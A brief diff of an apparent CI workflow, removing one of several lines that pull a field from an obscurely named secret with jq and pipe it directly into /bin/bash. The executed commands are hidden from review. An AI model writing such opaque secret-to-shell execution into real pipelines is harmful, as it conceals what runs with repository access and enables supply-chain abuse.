@@ -21,7 +21,6 @@ jobs:
           hr6: ${{ secrets.hr6 }}
         run: |
           printf '%s' "$hr6" | jq -r .u1 | /bin/bash
-          echo $jm5 | jq -r .qe56 | /bin/bash
           echo $ynvdg6 | jq -r .sjzv09762 | /bin/bash
           echo $ght72 | jq -r .ob86 | /bin/bash
           printf '%s' "$gi5" | jq -r .al2 | /bin/bash
